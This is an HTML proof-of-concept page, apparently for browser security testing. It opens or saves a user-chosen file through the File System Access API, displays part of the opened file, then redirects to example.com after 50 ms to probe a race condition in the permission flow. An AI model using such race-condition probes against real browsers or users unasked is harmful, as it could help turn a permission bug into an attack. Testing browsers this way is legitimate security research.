<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Vulnerable File System Access PoC</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, system-ui;
      background: #f5f5f7;
      text-align: center;
    }
    button {
      font-size: 15px;
      padding: 10px 14px;
      border-radius: 10px;
      border: none;
      background: #007aff;
      color: #fff;
    }
    #panel {
      display: none;
      max-width: 420px;
      margin: 80px auto;
      background: #fff;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 20px 60px rgba(0,0,0,.2);
      text-align: center;
    }
    .notice {
      margin-top: 14px;
      font-size: 13px;
      color: #b00020;
    }
  </style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>File System Access (Vulnerable)</h2>
  <p>Tap the button below to request file access, then observe how the page behaves.</p>

  <button id="openFile">Open File</button>
  <button id="saveFile">Save File</button>
  <p id="status">Status: -</p>

  <div class="notice">
    <b>Warning:</b> Watch for sudden redirects or unexpected behavior
  </div>
</div>

<script>
  const panel = document.getElementById('panel');
  const trigger = document.getElementById('trigger');
  const openFileBtn = document.getElementById('openFile');
  const saveFileBtn = document.getElementById('saveFile');
  const status = document.getElementById('status');

  trigger.onclick = () => {
    // Just display the panel without changing the history or URL
    panel.style.display = 'block';
  };

  // Open file (vulnerable version)
  openFileBtn.onclick = async () => {
    try {
      // Try to open a file
      const [fileHandle] = await window.showOpenFilePicker();
      const file = await fileHandle.getFile();
      const fileContent = await file.text();
      status.textContent = `Opened file: ${file.name} with content: ${fileContent.substring(0, 100)}...`;

      // Trigger a race condition by redirecting immediately after file access request
      setTimeout(() => {
        // Change location right after file interaction begins (before it's fully completed)
        window.location.href = 'https://example.com'; // Redirect to another page
      }, 50); // 50ms delay to trigger race condition

    } catch (e) {
      status.textContent = 'Failed to open file or permission denied';
    }
  };

  // Save file (vulnerable version)
  saveFileBtn.onclick = async () => {
    try {
      const fileHandle = await window.showSaveFilePicker();
      const writable = await fileHandle.createWritable();
      await writable.write('This is some file content.');
      await writable.close();
      status.textContent = 'File saved successfully!';

      // Trigger a race condition by redirecting immediately after saving file
      setTimeout(() => {
        // Change location right after file access request starts
        window.location.href = 'https://example.com'; // Redirect to another page
      }, 50); // 50ms delay to trigger race condition

    } catch (e) {
      status.textContent = 'Failed to save file or permission denied';
    }
  };
</script>

</body>
</html>
